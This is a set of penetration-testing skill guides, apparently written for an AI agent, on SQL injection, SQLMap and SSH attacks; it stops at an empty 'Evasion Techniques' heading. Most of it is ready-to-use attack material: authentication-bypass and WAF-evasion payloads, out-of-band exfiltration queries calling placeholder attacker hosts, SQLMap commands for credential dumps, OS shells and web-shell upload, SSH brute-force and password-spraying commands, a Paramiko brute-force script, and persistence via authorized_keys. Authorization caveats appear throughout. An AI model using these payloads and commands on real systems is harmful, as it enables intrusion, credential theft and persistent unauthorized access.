Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.

## Inputs / Prerequisites

### Required Access
- Target web application URL with injectable parameters
- Burp Suite or equivalent proxy tool for request manipulation
- SQLMap installation for automated exploitation
- Browser with developer tools enabled

### Technical Requirements
- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
- Knowledge of HTTP request/response cycle
- Familiarity with database schemas and structures
- Write permissions for testing reports

### Legal Prerequisites
- Written authorization for penetration testing
- Defined scope including target URLs and parameters
- Emergency contact procedures established
- Data handling agreements in place

## Outputs / Deliverables

### Primary Outputs
- SQL injection vulnerability report with severity ratings
- Extracted database schemas and table structures
- Authentication bypass proof-of-concept demonstrations
- Remediation recommendations with code examples

### Evidence Artifacts
- Screenshots of successful injections
- HTTP request/response logs
- Database dumps (sanitized)
- Payload documentation

## Core Workflow

### Phase 1: Detection and Reconnaissance

#### Identify Injectable Parameters
Locate user-controlled input fields that interact with database queries:

```
# Common injection points
- URL parameters: ?id=1, ?user=admin, ?category=books
- Form fields: username, password, search, comments
- Cookie values: session_id, user_preference
- HTTP headers: User-Agent, Referer, X-Forwarded-For
```

#### Test for Basic Vulnerability Indicators
Insert special characters to trigger error responses:

```sql
-- Single quote test
'

-- Double quote test
"

-- Comment sequences
--
#
/**/

-- Semicolon for query stacking
;

-- Parentheses
)
```

Monitor application responses for:
- Database error messages revealing query structure
- Unexpected application behavior changes
- HTTP 500 Internal Server errors
- Modified response content or length

#### Logic Testing Payloads
Verify boolean-based vulnerability presence:

```sql
-- True condition tests
page.asp?id=1 or 1=1
page.asp?id=1' or 1=1--
page.asp?id=1" or 1=1--

-- False condition tests
page.asp?id=1 and 1=2
page.asp?id=1' and 1=2--
```

Compare responses between true and false conditions to confirm injection capability.

### Phase 2: Exploitation Techniques

#### UNION-Based Extraction
Combine attacker-controlled SELECT statements with original query:

```sql
-- Determine column count
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
-- Continue until error occurs

-- Find displayable columns
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--
UNION SELECT NULL,'a',NULL--

-- Extract data
UNION SELECT username,password,NULL FROM users--
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Error-Based Extraction
Force database errors that leak information:

```sql
-- MSSQL version extraction
1' AND 1=CONVERT(int,(SELECT @@version))--

-- MySQL extraction via XPATH
1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--

-- PostgreSQL cast errors
1' AND 1=CAST((SELECT version()) AS int)--
```

#### Blind Boolean-Based Extraction
Infer data through application behavior changes:

```sql
-- Character extraction
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--

-- Conditional responses
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

#### Time-Based Blind Extraction
Use database sleep functions for confirmation:

```sql
-- MySQL
1' AND IF(1=1,SLEEP(5),0)--
1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- MSSQL
1'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
1'; SELECT pg_sleep(5)--
```

#### Out-of-Band (OOB) Extraction
Exfiltrate data through external channels:

```sql
-- MSSQL DNS exfiltration
1; EXEC master..xp_dirtree '\\attacker-server.com\share'--

-- MySQL DNS exfiltration
1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--

-- Oracle HTTP request
1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
```

### Phase 3: Authentication Bypass

#### Login Form Exploitation
Craft payloads to bypass credential verification:

```sql
-- Classic bypass
admin'--
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
') OR ('1'='1'--

-- Username enumeration
admin' AND '1'='1
admin' AND '1'='2
```

Query transformation example:
```sql
-- Original query
SELECT * FROM users WHERE username='input' AND password='input'

-- Injected (username: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Password check bypassed via comment
```

### Phase 4: Filter Bypass Techniques

#### Character Encoding Bypass
When special characters are blocked:

```sql
-- URL encoding
%27 (single quote)
%22 (double quote)
%23 (hash)

-- Double URL encoding
%2527 (single quote)

-- Unicode alternatives
U+0027 (apostrophe)
U+02B9 (modifier letter prime)

-- Hexadecimal strings (MySQL)
SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
```

#### Whitespace Bypass
Substitute blocked spaces:

```sql
-- Comment substitution
SELECT/**/username/**/FROM/**/users
SEL/**/ECT/**/username/**/FR/**/OM/**/users

-- Alternative whitespace
SELECT%09username%09FROM%09users  -- Tab character
SELECT%0Ausername%0AFROM%0Ausers  -- Newline
```

#### Keyword Bypass
Evade blacklisted SQL keywords:

```sql
-- Case variation
SeLeCt, sElEcT, SELECT

-- Inline comments
SEL/*bypass*/ECT
UN/*bypass*/ION

-- Double writing (if filter removes once)
SELSELECTECT → SELECT
UNUNIONION → UNION

-- Null byte injection
%00SELECT
SEL%00ECT
```

## Quick Reference

### Detection Test Sequence
```
1. Insert ' → Check for error
2. Insert " → Check for error
3. Try: OR 1=1-- → Check for behavior change
4. Try: AND 1=2-- → Check for behavior change
5. Try: ' WAITFOR DELAY '0:0:5'-- → Check for delay
```

### Database Fingerprinting
```sql
-- MySQL
SELECT @@version
SELECT version()

-- MSSQL
SELECT @@version
SELECT @@servername

-- PostgreSQL
SELECT version()

-- Oracle
SELECT banner FROM v$version
SELECT * FROM v$version
```

### Information Schema Queries
```sql
-- MySQL/MSSQL table enumeration
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- Column enumeration
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle equivalent
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

### Common Payloads Quick List
| Purpose | Payload |
|---------|---------|
| Basic test | `'` or `"` |
| Boolean true | `OR 1=1--` |
| Boolean false | `AND 1=2--` |
| Comment (MySQL) | `#` or `-- ` |
| Comment (MSSQL) | `--` |
| UNION probe | `UNION SELECT NULL--` |
| Time delay | `AND SLEEP(5)--` |
| Auth bypass | `' OR '1'='1` |

## Constraints and Guardrails

### Operational Boundaries
- Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
- Limit data extraction to proof-of-concept quantities
- Avoid denial-of-service through resource-intensive queries
- Stop immediately upon detecting production database with real user data

### Technical Limitations
- WAF/IPS may block common payloads requiring evasion techniques
- Parameterized queries prevent standard injection
- Some blind injection requires extensive requests (rate limiting concerns)
- Second-order injection requires understanding of data flow

### Legal and Ethical Requirements
- Written scope agreement must exist before testing
- Document all extracted data and handle per data protection requirements
- Report critical vulnerabilities immediately through agreed channels
- Never access data beyond scope requirements

## Examples

### Example 1: E-commerce Product Page SQLi

**Scenario**: Testing product display page with ID parameter

**Initial Request**:
```
GET /product.php?id=5 HTTP/1.1
```

**Detection Test**:
```
GET /product.php?id=5' HTTP/1.1
Response: MySQL error - syntax error near '''
```

**Column Enumeration**:
```
GET /product.php?id=5 ORDER BY 4-- HTTP/1.1
Response: Normal
GET /product.php?id=5 ORDER BY 5-- HTTP/1.1
Response: Error (4 columns confirmed)
```

**Data Extraction**:
```
GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
Response: Displays admin credentials
```

### Example 2: Blind Time-Based Extraction

**Scenario**: No visible output, testing for blind injection

**Confirm Vulnerability**:
```sql
id=5' AND SLEEP(5)--
-- Response delayed by 5 seconds (vulnerable confirmed)
```

**Extract Database Name Length**:
```sql
id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
-- Delay confirms database name is 8 characters
```

**Extract Characters**:
```sql
id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
-- Iterate through characters to extract: 'appstore'
```

### Example 3: Login Bypass

**Target**: Admin login form

**Standard Login Query**:
```sql
SELECT * FROM users WHERE username='[input]' AND password='[input]'
```

**Injection Payload**:
```
Username: administrator'--
Password: anything
```

**Resulting Query**:
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='anything'
```

**Result**: Password check bypassed, authenticated as administrator.

## Troubleshooting

### No Error Messages Displayed
- Application uses generic error handling
- Switch to blind injection techniques (boolean or time-based)
- Monitor response length differences instead of content

### UNION Injection Fails
- Column count may be incorrect → Test with ORDER BY
- Data types may mismatch → Use NULL for all columns first
- Results may not display → Find injectable column positions

### WAF Blocking Requests
- Use encoding techniques (URL, hex, unicode)
- Insert inline comments within keywords
- Try alternative syntax for same operations
- Fragment payload across multiple parameters

### Payload Not Executing
- Verify correct comment syntax for database type
- Check if application uses parameterized queries
- Confirm input reaches SQL query (not filtered client-side)
- Test different injection points (headers, cookies)

### Time-Based Injection Inconsistent
- Network latency may cause false positives
- Use longer delays (10+ seconds) for clarity
- Run multiple tests to confirm pattern
- Consider server-side caching effects


---

<a id="sqlmapdatabasepentesting"></a>

## Sqlmap Database Pentesting

---
name: SQLMap Database Penetration Testing
description: This skill should be used when the user asks to "automate SQL injection testing," "enumerate database structure," "extract database credentials using sqlmap," "dump tables and columns from a vulnerable database," or "perform automated database penetration testing." It provides comprehensive guidance for using SQLMap to detect and exploit SQL injection vulnerabilities.
metadata:
  author: zebbern
  version: "1.1"
---

# SQLMap Database Penetration Testing

## Purpose

Provide systematic methodologies for automated SQL injection detection and exploitation using SQLMap. This skill covers database enumeration, table and column discovery, data extraction, multiple target specification methods, and advanced exploitation techniques for MySQL, PostgreSQL, MSSQL, Oracle, and other database management systems.

## Inputs / Prerequisites

- **Target URL**: Web application URL with injectable parameter (e.g., `?id=1`)
- **SQLMap Installation**: Pre-installed on Kali Linux or downloaded from GitHub
- **Verified Injection Point**: URL parameter confirmed or suspected to be SQL injectable
- **Request File (Optional)**: Burp Suite captured HTTP request for POST-based injection
- **Authorization**: Written permission for penetration testing activities

## Outputs / Deliverables

- **Database Enumeration**: List of all databases on the target server
- **Table Structure**: Complete table names within target database
- **Column Mapping**: Column names and data types for each table
- **Extracted Data**: Dumped records including usernames, passwords, and sensitive data
- **Hash Values**: Password hashes for offline cracking
- **Vulnerability Report**: Confirmation of SQL injection type and severity

## Core Workflow

### 1. Identify SQL Injection Vulnerability

#### Manual Verification
```bash
# Add single quote to break query
http://target.com/page.php?id=1'

# If error message appears, likely SQL injectable
# Error example: "You have an error in your SQL syntax"
```

#### Initial SQLMap Scan
```bash
# Basic vulnerability detection
sqlmap -u "http://target.com/page.php?id=1" --batch

# With verbosity for detailed output
sqlmap -u "http://target.com/page.php?id=1" --batch -v 3
```

### 2. Enumerate Databases

#### List All Databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

**Key Options:**
- `-u`: Target URL with injectable parameter
- `--dbs`: Enumerate database names
- `--batch`: Use default answers (non-interactive mode)

### 3. Enumerate Tables

#### List Tables in Specific Database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
```

**Key Options:**
- `-D`: Specify target database name
- `--tables`: Enumerate table names

### 4. Enumerate Columns

#### List Columns in Specific Table
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns --batch
```

**Key Options:**
- `-T`: Specify target table name
- `--columns`: Enumerate column names

### 5. Extract Data

#### Dump Specific Table Data
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --batch
```

#### Dump Specific Columns
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump --batch
```

#### Dump Entire Database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all --batch
```

**Key Options:**
- `--dump`: Extract all data from specified table
- `--dump-all`: Extract all data from all tables
- `-C`: Specify column names to extract

### 6. Advanced Target Options

#### Target from HTTP Request File
```bash
# Save Burp Suite request to file, then:
sqlmap -r /path/to/request.txt --dbs --batch
```

#### Target from Log File
```bash
# Feed log file with multiple requests
sqlmap -l /path/to/logfile --dbs --batch
```

#### Target Multiple URLs (Bulk File)
```bash
# Create file with URLs, one per line:
# http://target1.com/page.php?id=1
# http://target2.com/page.php?id=2
sqlmap -m /path/to/bulkfile.txt --dbs --batch
```

#### Target via Google Dorks (Use with Caution)
```bash
# Automatically find and test vulnerable sites (LEGAL TARGETS ONLY)
sqlmap -g "inurl:?id= site:yourdomain.com" --batch
```

## Quick Reference Commands

### Database Enumeration Progression

| Stage | Command |
|-------|---------|
| List Databases | `sqlmap -u "URL" --dbs --batch` |
| List Tables | `sqlmap -u "URL" -D dbname --tables --batch` |
| List Columns | `sqlmap -u "URL" -D dbname -T tablename --columns --batch` |
| Dump Data | `sqlmap -u "URL" -D dbname -T tablename --dump --batch` |
| Dump All | `sqlmap -u "URL" -D dbname --dump-all --batch` |

### Supported Database Management Systems

| DBMS | Support Level |
|------|---------------|
| MySQL | Full Support |
| PostgreSQL | Full Support |
| Microsoft SQL Server | Full Support |
| Oracle | Full Support |
| Microsoft Access | Full Support |
| IBM DB2 | Full Support |
| SQLite | Full Support |
| Firebird | Full Support |
| Sybase | Full Support |
| SAP MaxDB | Full Support |
| HSQLDB | Full Support |
| Informix | Full Support |

### SQL Injection Techniques

| Technique | Description | Flag |
|-----------|-------------|------|
| Boolean-based blind | Infers data from true/false responses | `--technique=B` |
| Time-based blind | Uses time delays to infer data | `--technique=T` |
| Error-based | Extracts data from error messages | `--technique=E` |
| UNION query-based | Uses UNION to append results | `--technique=U` |
| Stacked queries | Executes multiple statements | `--technique=S` |
| Out-of-band | Uses DNS or HTTP for exfiltration | `--technique=Q` |

### Essential Options

| Option | Description |
|--------|-------------|
| `-u` | Target URL |
| `-r` | Load HTTP request from file |
| `-l` | Parse targets from Burp/WebScarab log |
| `-m` | Bulk file with multiple targets |
| `-g` | Google dork (use responsibly) |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--columns` | Enumerate columns |
| `--dump` | Dump table data |
| `--dump-all` | Dump all database data |
| `-D` | Specify database |
| `-T` | Specify table |
| `-C` | Specify columns |
| `--batch` | Non-interactive mode |
| `--random-agent` | Use random User-Agent |
| `--level` | Level of tests (1-5) |
| `--risk` | Risk of tests (1-3) |

## Constraints and Limitations

### Operational Boundaries
- Requires valid injectable parameter in target URL
- Network connectivity to target database server required
- Large database dumps may take significant time
- Some WAF/IPS systems may block SQLMap traffic
- Time-based attacks significantly slower than error-based

### Performance Considerations
- Use `--threads` to speed up enumeration (default: 1)
- Limit dumps with `--start` and `--stop` for large tables
- Use `--technique` to specify faster injection method if known

### Legal Requirements
- Only test systems with explicit written authorization
- Google dork attacks against unknown sites are illegal
- Document all testing activities and findings
- Respect scope limitations defined in engagement rules

### Detection Risk
- SQLMap generates significant log entries
- Use `--random-agent` to vary User-Agent header
- Consider `--delay` to avoid triggering rate limits
- Proxy through Tor with `--tor` for anonymity (authorized tests only)

## Examples

### Example 1: Complete Database Enumeration
```bash
# Step 1: Discover databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
# Result: acuart database found

# Step 2: List tables
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
# Result: users, products, carts, etc.

# Step 3: List columns
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
# Result: username, password, email columns

# Step 4: Dump user credentials
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
```

### Example 2: POST Request Injection
```bash
# Save Burp request to file (login.txt):
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
#
# username=admin&password=test

# Run SQLMap with request file
sqlmap -r /root/Desktop/login.txt -p username --dbs --batch
```

### Example 3: Bulk Target Scanning
```bash
# Create bulkfile.txt:
echo "http://192.168.1.10/sqli/Less-1/?id=1" > bulkfile.txt
echo "http://192.168.1.10/sqli/Less-2/?id=1" >> bulkfile.txt

# Scan all targets
sqlmap -m bulkfile.txt --dbs --batch
```

### Example 4: Aggressive Testing
```bash
# High level and risk for thorough testing
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --level=5 --risk=3

# Specify all techniques
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --technique=BEUSTQ
```

### Example 5: Extract Specific Credentials
```bash
# Target specific columns
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T admin_users \
  -C admin_name,admin_pass,admin_email \
  --dump --batch

# Automatically crack password hashes
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T users \
  --dump --batch \
  --passwords
```

### Example 6: OS Shell Access (Advanced)
```bash
# Get interactive OS shell (requires DBA privileges)
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch

# Execute specific OS command
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami" --batch

# File read from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch

# File upload to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
```

## Troubleshooting

### Issue: "Parameter does not seem injectable"
**Cause**: SQLMap cannot find injection point
**Solution**:
```bash
# Increase testing level and risk
sqlmap -u "URL" --dbs --batch --level=5 --risk=3

# Specify parameter explicitly
sqlmap -u "URL" -p "id" --dbs --batch

# Try different injection techniques
sqlmap -u "URL" --dbs --batch --technique=BT

# Add prefix/suffix for filter bypass
sqlmap -u "URL" --dbs --batch --prefix="'" --suffix="-- -"
```

### Issue: Target Behind WAF/Firewall
**Cause**: Web Application Firewall blocking requests
**Solution**:
```bash
# Use tamper scripts
sqlmap -u "URL" --dbs --batch --tamper=space2comment

# List available tamper scripts
sqlmap --list-tampers

# Common tamper combinations
sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase

# Add delay between requests
sqlmap -u "URL" --dbs --batch --delay=2

# Use random User-Agent
sqlmap -u "URL" --dbs --batch --random-agent
```

### Issue: Connection Timeout
**Cause**: Network issues or slow target
**Solution**:
```bash
# Increase timeout
sqlmap -u "URL" --dbs --batch --timeout=60

# Reduce threads
sqlmap -u "URL" --dbs --batch --threads=1

# Add retries
sqlmap -u "URL" --dbs --batch --retries=5
```

### Issue: Time-Based Attacks Too Slow
**Cause**: Default time delay too conservative
**Solution**:
```bash
# Reduce time delay (risky, may cause false negatives)
sqlmap -u "URL" --dbs --batch --time-sec=3

# Use boolean-based instead if possible
sqlmap -u "URL" --dbs --batch --technique=B
```

### Issue: Cannot Dump Large Tables
**Cause**: Table has too many records
**Solution**:
```bash
# Limit number of records
sqlmap -u "URL" -D db -T table --dump --batch --start=1 --stop=100

# Dump specific columns only
sqlmap -u "URL" -D db -T table -C username,password --dump --batch

# Exclude specific columns
sqlmap -u "URL" -D db -T table --dump --batch --exclude-sysdbs
```

### Issue: Session Drops During Long Scan
**Cause**: Session timeout or connection reset
**Solution**:
```bash
# Save and resume session
sqlmap -u "URL" --dbs --batch --output-dir=/root/sqlmap_session

# Resume from saved session
sqlmap -u "URL" --dbs --batch --resume

# Use persistent HTTP connection
sqlmap -u "URL" --dbs --batch --keep-alive
```


---

<a id="sshpenetrationtesting"></a>

## Ssh Penetration Testing

---
name: SSH Penetration Testing
description: This skill should be used when the user asks to "pentest SSH services", "enumerate SSH configurations", "brute force SSH credentials", "exploit SSH vulnerabilities", "perform SSH tunneling", or "audit SSH security". It provides comprehensive SSH penetration testing methodologies and techniques.
metadata:
  author: zebbern
  version: "1.1"
---

# SSH Penetration Testing

## Purpose

Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.

## Prerequisites

### Required Tools
- Nmap with SSH scripts
- Hydra or Medusa for brute-forcing
- ssh-audit for configuration analysis
- Metasploit Framework
- Python with Paramiko library

### Required Knowledge
- SSH protocol fundamentals
- Public/private key authentication
- Port forwarding concepts
- Linux command-line proficiency

## Outputs and Deliverables

1. **SSH Enumeration Report** - Versions, algorithms, configurations
2. **Credential Assessment** - Weak passwords, default credentials
3. **Vulnerability Assessment** - Known CVEs, misconfigurations
4. **Tunnel Documentation** - Port forwarding configurations

## Core Workflow

### Phase 1: SSH Service Discovery

Identify SSH services on target networks:

```bash
# Quick SSH port scan
nmap -p 22 192.168.1.0/24 --open

# Common alternate SSH ports
nmap -p 22,2222,22222,2200 192.168.1.100

# Full port scan for SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# Service version detection
nmap -sV -p 22 192.168.1.100
```

### Phase 2: SSH Enumeration

Gather detailed information about SSH services:

```bash
# Banner grabbing
nc 192.168.1.100 22
# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet banner grab
telnet 192.168.1.100 22

# Nmap version detection with scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# Enumerate supported algorithms
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Get host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# Check authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### Phase 3: SSH Configuration Auditing

Identify weak configurations:

```bash
# ssh-audit - comprehensive SSH audit
ssh-audit 192.168.1.100

# ssh-audit with specific port
ssh-audit -p 2222 192.168.1.100

# Output includes:
# - Algorithm recommendations
# - Security vulnerabilities
# - Hardening suggestions
```

Key configuration weaknesses to identify:
- Weak key exchange algorithms (diffie-hellman-group1-sha1)
- Weak ciphers (arcfour, 3des-cbc)
- Weak MACs (hmac-md5, hmac-sha1-96)
- Deprecated protocol versions

### Phase 4: Credential Attacks

#### Brute-Force with Hydra

```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### Brute-Force with Medusa

```bash
# Basic brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# With username list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Specific port
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### Password Spraying

```bash
# Test common password across users
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

### Phase 5: Key-Based Authentication Testing

Test for weak or exposed keys:

```bash
# Attempt login with found private key
ssh -i id_rsa user@192.168.1.100

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100

# Force password authentication
ssh -o PreferredAuthentications=password user@192.168.1.100

# Try common key names
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@192.168.1.100
done
```

Check for exposed keys:

```bash
# Common locations for private keys
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/etc/ssh/ssh_host_*_key
/root/.ssh/
/home/*/.ssh/

# Web-accessible keys (check with curl/wget)
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
curl -s http://target.com/backup/ssh_keys.tar.gz
```

### Phase 6: Vulnerability Exploitation

Search for known vulnerabilities:

```bash
# Search for exploits
searchsploit openssh
searchsploit openssh 7.2

# Common SSH vulnerabilities
# CVE-2018-15473 - Username enumeration
# CVE-2016-0777 - Roaming vulnerability
# CVE-2016-0778 - Buffer overflow

# Metasploit enumeration
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.100
run

# Username enumeration (CVE-2018-15473)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/users.txt
run
```

### Phase 7: SSH Tunneling and Port Forwarding

#### Local Port Forwarding

Forward local port to remote service:

```bash
# Syntax: ssh -L <local_port>:<remote_host>:<remote_port> user@ssh_server

# Access internal web server through SSH
ssh -L 8080:192.168.1.50:80 user@192.168.1.100
# Now access http://localhost:8080

# Access internal database
ssh -L 3306:192.168.1.50:3306 user@192.168.1.100

# Multiple forwards
ssh -L 8080:192.168.1.50:80 -L 3306:192.168.1.51:3306 user@192.168.1.100
```

#### Remote Port Forwarding

Expose local service to remote network:

```bash
# Syntax: ssh -R <remote_port>:<local_host>:<local_port> user@ssh_server

# Expose local web server to remote
ssh -R 8080:localhost:80 user@192.168.1.100
# Remote can access via localhost:8080

# Reverse shell callback
ssh -R 4444:localhost:4444 user@192.168.1.100
```

#### Dynamic Port Forwarding (SOCKS Proxy)

Create SOCKS proxy for network pivoting:

```bash
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@192.168.1.100

# Use with proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -sT -Pn 192.168.1.0/24

# Browser configuration
# Set SOCKS proxy to localhost:1080
```

#### ProxyJump (Jump Hosts)

Chain through multiple SSH servers:

```bash
# Jump through intermediate host
ssh -J user1@jump_host user2@target_host

# Multiple jumps
ssh -J user1@jump1,user2@jump2 user3@target

# With SSH config
# ~/.ssh/config
Host target
    HostName 192.168.2.50
    User admin
    ProxyJump user@192.168.1.100
```

### Phase 8: Post-Exploitation

Activities after gaining SSH access:

```bash
# Check sudo privileges
sudo -l

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Check SSH directory
ls -la ~/.ssh/
cat ~/.ssh/known_hosts
cat ~/.ssh/authorized_keys

# Add persistence (add your key)
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Extract SSH configuration
cat /etc/ssh/sshd_config

# Find other users
cat /etc/passwd | grep -v nologin
ls /home/

# History for credentials
cat ~/.bash_history | grep -i ssh
cat ~/.bash_history | grep -i pass
```

### Phase 9: Custom SSH Scripts with Paramiko

Python-based SSH automation:

```python
#!/usr/bin/env python3
import paramiko
import sys

def ssh_connect(host, username, password):
    """Attempt SSH connection with credentials"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, username=username, password=password, timeout=5)
        print(f"[+] Success: {username}:{password}")
        return client
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}:{password}")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def execute_command(client, command):
    """Execute command via SSH"""
    stdin, stdout, stderr = client.exec_command(command)
    output = stdout.read().decode()
    errors = stderr.read().decode()
    return output, errors

def ssh_brute_force(host, username, wordlist):
    """Brute-force SSH with wordlist"""
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        client = ssh_connect(host, username, password.strip())
        if client:
            # Run post-exploitation commands
            output, _ = execute_command(client, 'id; uname -a')
            print(output)
            client.close()
            return True
    return False

# Usage
if __name__ == "__main__":
    target = "192.168.1.100"
    user = "admin"

    # Single credential test
    client = ssh_connect(target, user, "password123")
    if client:
        output, _ = execute_command(client, "ls -la")
        print(output)
        client.close()
```

### Phase 10: Metasploit SSH Modules

Use Metasploit for comprehensive SSH testing:

```bash
# Start Metasploit
msfconsole

# SSH Version Scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# SSH Login Brute-Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE true
run

# SSH Key Login
use auxiliary/scanner/ssh/ssh_login_pubkey
set RHOSTS 192.168.1.100
set USERNAME admin
set KEY_FILE /path/to/id_rsa
run

# Username Enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.100
set USER_FILE users.txt
run

# Post-exploitation with SSH session
sessions -i 1
```

## Quick Reference

### SSH Enumeration Commands

| Command | Purpose |
|---------|---------|
| `nc <host> 22` | Banner grabbing |
| `ssh-audit <host>` | Configuration audit |
| `nmap --script ssh*` | SSH NSE scripts |
| `searchsploit openssh` | Find exploits |

### Brute-Force Options

| Tool | Command |
|------|---------|
| Hydra | `hydra -l user -P pass.txt ssh://host` |
| Medusa | `medusa -h host -u user -P pass.txt -M ssh` |
| Ncrack | `ncrack -p 22 --user admin -P pass.txt host` |
| Metasploit | `use auxiliary/scanner/ssh/ssh_login` |

### Port Forwarding Types

| Type | Command | Use Case |
|------|---------|----------|
| Local | `-L 8080:target:80` | Access remote services locally |
| Remote | `-R 8080:localhost:80` | Expose local services remotely |
| Dynamic | `-D 1080` | SOCKS proxy for pivoting |

### Common SSH Ports

| Port | Description |
|------|-------------|
| 22 | Default SSH |
| 2222 | Common alternate |
| 22222 | Another alternate |
| 830 | NETCONF over SSH |

## Constraints and Limitations

### Legal Considerations
- Always obtain written authorization
- Brute-forcing may violate ToS
- Document all testing activities

### Technical Limitations
- Rate limiting may block attacks
- Fail2ban or similar may ban IPs
- Key-based auth prevents password attacks
- Two-factor authentication adds complexity

### Evasion Techniques
